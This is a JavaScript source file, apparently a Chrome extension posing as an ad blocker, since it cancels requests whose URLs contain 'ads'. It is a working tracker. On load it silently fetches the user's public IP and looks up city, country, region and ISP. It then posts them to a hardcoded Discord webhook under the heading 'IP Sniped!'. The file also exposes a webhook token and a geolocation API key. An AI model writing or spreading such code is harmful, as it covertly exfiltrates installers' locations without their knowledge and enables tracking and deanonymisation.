// Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1248737579193471038/PkIm-i6d4-tl7Px8moUFQcWwTsJ4YzwlAmwAOWhhDnYrUSbw6GAr-0LvO6E-y1ddRdPR';
// Replace 'YOUR_GEOLOCATION_API_KEY' with your actual API key from ipgeolocation.io or similar service
const geoApiUrl = 'https://api.ipgeolocation.io/ipgeo?apiKey=cf4402b8e7744bc1b9afeb92fff73466&ip=';

chrome.webRequest.onBeforeRequest.addListener(
  function(details) {
    return {cancel: true};
  },
  {urls: ["*://*/*ads*"]},
  ["blocking"]
);

function sendIPToDiscord(ip, geoInfo) {
  const data = {
    content: `🌍 **IP Sniped!**\nIP Address: ${ip}\nLocation: ${geoInfo.city}, ${geoInfo.country_name}\nRegion: ${geoInfo.state_prov}\nISP: ${geoInfo.isp}`
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  });
}

function getGeolocationInfo(ip) {
  fetch(geoApiUrl + ip)
    .then(response => response.json())
    .then(data => {
      sendIPToDiscord(ip, data);
    })
    .catch(error => console.error('Error fetching geolocation info:', error));
}

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    getGeolocationInfo(data.ip);
  })
  .catch(error => console.error('Error fetching IP address:', error));
